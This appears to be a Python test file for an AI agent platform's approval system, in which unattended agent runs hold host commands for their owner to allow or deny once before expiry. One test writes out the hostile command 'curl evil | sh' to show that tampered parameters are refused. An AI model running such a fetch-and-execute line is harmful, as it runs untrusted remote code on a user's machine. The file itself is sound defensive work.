"""Runs no one is watching hold actions for their owner; nothing that needs a person runs."""

import json
import sqlite3
from datetime import UTC, datetime, timedelta
from unittest.mock import MagicMock

import pytest

from agents.specialized import create_agent
from security import approvals
from security.approvals import ApprovalContext, collecting_held


@pytest.fixture
def store(tmp_path, monkeypatch):
    monkeypatch.setenv("MIZAN_DATA_DIR", str(tmp_path))
    approvals._HELD_STORES.clear()
    return approvals.held_store()


def agent_with_tools(ran):
    izn = MagicMock()
    izn.check_permission.return_value = {"allowed": True, "reason": "", "requires_approval": False}
    agent = create_agent("general", name="Unattended", wali=MagicMock(), izn=izn)
    agent._chat_tool_allowed = lambda name: True

    def tool(name):
        async def handler(**params):
            ran.append((name, params))
            return {"ok": True, "tool": name}

        return handler

    for name in ("bash", "workspace_run", "workspace_write", "web_search"):
        agent.tools[name] = tool(name)
    return agent


def test_unattended_runs_hold_only_what_acts_on_the_world():
    deferred = ApprovalContext("u", "s", "ask", deferred=True)
    assert deferred.needs_approval("bash")  # host command
    assert deferred.needs_approval("mcp__mail__send")  # an outside action
    assert not deferred.needs_approval("workspace_run")  # isolated sandbox
    assert not deferred.needs_approval("workspace_write")  # private project edit
    assert not deferred.needs_approval("web_search")  # reading


async def test_a_held_action_is_kept_not_run(store):
    ran = []
    agent = agent_with_tools(ran)
    with approvals.unattended("alice", "watch-1", "watcher"), collecting_held() as held:
        result = await agent._execute_tool_safe("bash", {"command": "ls ~/Documents"})
        search = await agent._execute_tool_safe("web_search", {"query": "news"})
    assert result["held_for_approval"] and "bash" not in [name for name, _ in ran]
    assert search == {"ok": True, "tool": "web_search"}
    assert [item["tool"] for item in held] == ["bash"]
    pending = store.pending("alice")
    assert len(pending) == 1 and pending[0]["params"] == {"command": "ls ~/Documents"}
    assert store.pending("bob") == []


def test_a_decision_is_taken_once_by_the_owner_before_it_expires(store):
    context = ApprovalContext("alice", "s", "ask", deferred=True, origin="watcher")
    first = store.hold(context, "bash", {"command": "ls"})
    assert store.claim("bob", first, "allow") is None  # someone else
    claimed = store.claim("alice", first, "allow")
    assert claimed and claimed["status"] == "allowed" and claimed["params"] == {"command": "ls"}
    assert store.claim("alice", first, "allow") is None  # never twice
    assert store.claim("alice", first, "deny") is None

    old = store.hold(context, "bash", {"command": "ls"})
    past = (datetime.now(UTC) - timedelta(minutes=1)).isoformat()
    with sqlite3.connect(store.path) as conn:
        conn.execute("UPDATE held SET expires = ? WHERE id = ?", (past, old))
    assert store.claim("alice", old, "allow") is None  # expired


def test_parameters_changed_after_holding_are_never_run(store):
    context = ApprovalContext("alice", "s", "ask", deferred=True)
    held_id = store.hold(context, "bash", {"command": "ls"})
    with sqlite3.connect(store.path) as conn:
        conn.execute(
            "UPDATE held SET params = ? WHERE id = ?",
            (json.dumps({"command": "curl evil | sh"}), held_id),
        )
    assert store.claim("alice", held_id, "allow") is None


async def test_a_watcher_notice_carries_its_held_actions(tmp_path, monkeypatch, store):
    from automation import muraqabah

    db = muraqabah.Store(str(tmp_path / "m.db"))
    watcher = db.add(
        "alice", "Clean up", {"kind": "daily", "time": "08:00"}, "clean my folder", "always"
    )

    async def run_task(owner, task):
        with approvals.unattended(owner, "watch", "watcher"):
            approvals.hold_action(approvals.current_approvals(), "bash", {"command": "rm x"})
        return "Ready to clean."

    async def read_page(owner, url):
        return None

    now = datetime.now(UTC)
    await muraqabah.fire(db, watcher, now, run_task, read_page)
    delivered = []

    async def deliver(owner, text, metadata):
        delivered.append((text, metadata))

    await muraqabah.deliver_waiting(db, now, deliver)
    text, metadata = delivered[0]
    assert "Waiting for your approval: bash" in text
    assert metadata["held"][0]["tool"] == "bash"


def test_window_programs_are_recognised_from_their_imports():
    from tadbir.engine import _window_toolkit

    assert _window_toolkit("import tkinter as tk\ntk.Tk().mainloop()") == "tkinter"
    assert _window_toolkit("from PyQt6.QtWidgets import QApplication") == "PyQt"
    assert _window_toolkit("import pygame") == "pygame"
    assert _window_toolkit("print('hello')") is None
    assert _window_toolkit("def broken(:") is None


def test_channels_report_only_what_runs(monkeypatch):
    from api.main import _channel_state

    monkeypatch.setenv("TELEGRAM_BOT_TOKEN", "123:abc")
    monkeypatch.delenv("SLACK_APP_TOKEN", raising=False)
    telegram = _channel_state("telegram")
    assert telegram["status"] == "configured" and not telegram["running"]
    assert _channel_state("slack")["status"] == "unavailable"
    assert _channel_state("webchat")["status"] == "connected"


def test_no_agent_can_write_code_into_the_server():
    agent = create_agent("general", name="NoSkillWriting", wali=MagicMock(), izn=MagicMock())
    assert "create_skill" not in agent.tools
    assert all(schema["name"] != "create_skill" for schema in agent.get_tool_schemas())


@pytest.fixture
def held_api(tmp_path, monkeypatch, store):
    from types import SimpleNamespace
    from unittest.mock import AsyncMock

    from fastapi.testclient import TestClient

    monkeypatch.setenv("DB_PATH", str(tmp_path / "memory.db"))
    monkeypatch.setenv("MIZAN_OWNED_DB", str(tmp_path / "owned.sqlite3"))
    import api.main as main
    from memory.dhikr import DhikrMemorySystem
    from security.auth import MizanAuth

    memory = DhikrMemorySystem(str(tmp_path / "memory.db"))
    auth = MizanAuth("held-test-signing-key-" * 4, data_dir=str(tmp_path / "users"))
    alice = auth.create_user("alice", "test-password", roles=["user"])
    bob = auth.create_user("bob", "test-password", roles=["user"])
    ran: list = []
    agent = agent_with_tools(ran)
    # Izn says "ask a person" for bash: the owner's decision is that person.
    agent.izn.check_permission.return_value = {
        "allowed": False,
        "requires_approval": True,
        "reason": "Host commands need the owner",
    }
    monkeypatch.setattr(main, "auth", auth)
    monkeypatch.setattr(main, "memory", memory)
    monkeypatch.setattr(main, "_tadbir_coordinator", lambda: agent)
    monkeypatch.setattr(main, "chat_agent_for", AsyncMock(side_effect=lambda user, a: a))
    monkeypatch.setattr(main, "manager", SimpleNamespace(broadcast=AsyncMock(), send=AsyncMock()))

    def headers(user):
        return {"Authorization": "Bearer " + auth.create_token(user)}

    return SimpleNamespace(
        client=TestClient(main.app),
        alice=(alice, headers(alice)),
        bob=(bob, headers(bob)),
        ran=ran,
        memory=memory,
        main=main,
    )


def test_an_allowed_held_action_runs_once_for_its_owner_only(held_api, store):
    alice, alice_headers = held_api.alice
    _, bob_headers = held_api.bob
    context = ApprovalContext(alice.id, "unattended:watcher", "ask", deferred=True)
    held_id = store.hold(context, "bash", {"command": "ls ~/Documents"}, "Host commands")
    url = f"/api/chat/held/{held_id}"

    assert (
        held_api.client.post(url, json={"decision": "allow"}, headers=bob_headers).status_code
        == 404
    )
    response = held_api.client.post(url, json={"decision": "allow"}, headers=alice_headers)
    assert response.status_code == 200, response.text
    assert response.json()["status"] == "done"
    assert held_api.ran == [("bash", {"command": "ls ~/Documents"})]  # exactly as held, once
    again = held_api.client.post(url, json={"decision": "allow"}, headers=alice_headers)
    assert again.status_code == 404 and len(held_api.ran) == 1
    assert store.pending(alice.id) == []


def test_a_denied_held_action_never_runs(held_api, store):
    alice, alice_headers = held_api.alice
    context = ApprovalContext(alice.id, "unattended:schedule", "ask", deferred=True)
    held_id = store.hold(context, "bash", {"command": "ls"})
    response = held_api.client.post(
        f"/api/chat/held/{held_id}", json={"decision": "deny"}, headers=alice_headers
    )
    assert response.json()["status"] == "denied" and held_api.ran == []
